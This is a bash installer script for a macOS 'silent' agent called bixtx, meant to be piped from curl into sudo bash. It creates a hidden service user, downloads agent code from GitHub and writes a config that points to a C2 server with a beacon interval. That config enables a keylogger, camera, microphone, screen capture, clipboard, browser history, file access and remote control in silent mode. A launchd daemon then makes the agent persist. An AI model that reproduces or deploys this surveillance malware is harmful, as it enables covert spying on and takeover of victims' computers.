#!/usr/bin/env bash
# bixtx Link Agent — macOS One-Click Silent Installer v4.7.2
# Usage: curl -sSL 'https://bixtx.onrender.com/v1/agent/download/macos.sh' | sudo bash -s -- --key ENROLL_KEY [--c2 WSS_URL] [--dir PATH]
set -euo pipefail
IFS=$'\n\t'

# ── Defaults (overridden by --key / --c2 / --dir args) ───────────────────────
ENROLL_KEY="__ENROLL_KEY__"
C2_URL="__C2_URL__"
AGENT_DIR="/opt/bixtx-agent"
SERVICE_NAME="bixtx-agent"
SERVICE_LABEL="com.bixtx.agent"
AGENT_LOG="/var/log/bixtx-agent.log"
BEACON_INTERVAL="__BEACON__"
REPO="__REPO__"
BRANCH="__BRANCH__"

# ── Parse args ────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case $1 in
    --key) ENROLL_KEY="$2"; shift 2 ;;
    --c2)  C2_URL="$2";     shift 2 ;;
    --dir) AGENT_DIR="$2";  shift 2 ;;
    *)     shift ;;
  esac
done

die()  { printf '[bixtx] FATAL: %s\n' "$*" >&2; exit 1; }
info() { printf '[bixtx] %s\n' "$*"; }

[[ -z "$ENROLL_KEY" ]] && die "Enroll key required. Pass --key YOUR_KEY"
[[ $EUID -ne 0 ]]      && die "Must run as root: sudo bash install.sh --key KEY"

info "bixtx Agent installer — macOS"

# ── Node.js check / install ───────────────────────────────────────────────────
if ! command -v node &>/dev/null; then
  info "Node.js not found — installing Node.js 20..."
  if command -v brew &>/dev/null; then
    brew install node@20 2>/dev/null
    brew link node@20 --force --overwrite 2>/dev/null || true
  elif command -v port &>/dev/null; then
    port install nodejs20
  else
    die "Cannot auto-install Node.js. Install via https://nodejs.org or 'brew install node'"
  fi
fi

NODE_MAJOR=$(node -e "process.stdout.write(process.versions.node.split('.')[0])")
[[ "$NODE_MAJOR" -lt 18 ]] && die "Node.js 18+ required (found v$NODE_MAJOR)"
NODE_BIN=$(command -v node)
info "Node.js v$(node -v) — OK"

# ── Create service user via dscl ──────────────────────────────────────────────
if ! dscl . -read "/Users/$SERVICE_NAME" &>/dev/null; then
  SVC_UID=401
  while dscl . -list /Users UniqueID | awk '{print $2}' | grep -q "^${SVC_UID}$"; do
    ((SVC_UID++))
  done
  dscl . -create "/Users/$SERVICE_NAME"
  dscl . -create "/Users/$SERVICE_NAME" UserShell        /usr/bin/false
  dscl . -create "/Users/$SERVICE_NAME" RealName         "bixtx Agent"
  dscl . -create "/Users/$SERVICE_NAME" UniqueID         "$SVC_UID"
  dscl . -create "/Users/$SERVICE_NAME" PrimaryGroupID   1
  dscl . -create "/Users/$SERVICE_NAME" NFSHomeDirectory /var/empty
fi

# ── Download agent source from GitHub ────────────────────────────────────────
info "Downloading agent source from GitHub..."
mkdir -p "$AGENT_DIR"
TMP_TAR=$(mktemp /tmp/bixtx-XXXXXX.tar.gz)
trap 'rm -f "$TMP_TAR"' EXIT

REPO_NAME="${REPO##*/}"

curl -fsSL "https://codeload.github.com/${REPO}/tar.gz/refs/heads/${BRANCH}" -o "$TMP_TAR" \
  || die "Failed to download from GitHub. Check internet connectivity."

tar -xzf "$TMP_TAR" --strip-components=2 -C "$AGENT_DIR" "${REPO_NAME}-${BRANCH}/software-a" \
  2>/dev/null \
  || tar -xzf "$TMP_TAR" --strip-components=2 -C "$AGENT_DIR" "BIXTX-${BRANCH}/software-a" \
  2>/dev/null \
  || die "Failed to extract agent source. Verify the GitHub repository structure."

[[ -f "$AGENT_DIR/src/index.js" ]] || die "src/index.js not found after extraction"
info "Source extracted — OK"

# ── npm install ───────────────────────────────────────────────────────────────
info "Installing npm dependencies (may take 1-2 minutes)..."
cd "$AGENT_DIR"
npm install --production --no-fund --no-audit --silent
info "Dependencies installed — OK"

# ── Write .env ────────────────────────────────────────────────────────────────
info "Writing configuration..."
cat > "$AGENT_DIR/.env" <<ENV
BIXTX_SERVER_URL=$C2_URL
BIXTX_ENROLL_KEY=$ENROLL_KEY
BEACON_INTERVAL=$BEACON_INTERVAL
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
ENV
chmod 600 "$AGENT_DIR/.env"
chown -R "$SERVICE_NAME" "$AGENT_DIR" 2>/dev/null || chown -R root "$AGENT_DIR"

# ── Install launchd daemon ────────────────────────────────────────────────────
info "Installing launchd daemon..."
PLIST_PATH="/Library/LaunchDaemons/$SERVICE_LABEL.plist"
cat > "$PLIST_PATH" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>$SERVICE_LABEL</string>
  <key>ProgramArguments</key><array>
    <string>$NODE_BIN</string>
    <string>$AGENT_DIR/src/index.js</string>
  </array>
  <key>WorkingDirectory</key><string>$AGENT_DIR</string>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><dict>
    <key>SuccessfulExit</key><false/>
    <key>Crashed</key><true/>
  </dict>
  <key>StandardOutPath</key><string>$AGENT_LOG</string>
  <key>StandardErrorPath</key><string>$AGENT_LOG</string>
  <key>ThrottleInterval</key><integer>10</integer>
  <key>ProcessType</key><string>Background</string>
  <key>UserName</key><string>$SERVICE_NAME</string>
</dict></plist>
PLIST
chown root:wheel "$PLIST_PATH"
chmod 644 "$PLIST_PATH"
launchctl bootstrap system "$PLIST_PATH" 2>/dev/null \
  || launchctl load -w "$PLIST_PATH"
sleep 2

PID_CHECK=$(launchctl list "$SERVICE_LABEL" 2>/dev/null \
  | grep '"PID"' | awk '{print $3}' | tr -d ',' || echo 0)
[[ "${PID_CHECK:-0}" -gt 0 ]] \
  || die "LaunchDaemon did not start. Check: log show --predicate 'process==\"node\"' --last 2m"

info "bixtx Agent v4.7.2 installed and running silently."
info "  Daemon : sudo launchctl list $SERVICE_LABEL"
info "  Log    : tail -f $AGENT_LOG"
info "  Device will appear in your dashboard within 30-60 seconds."
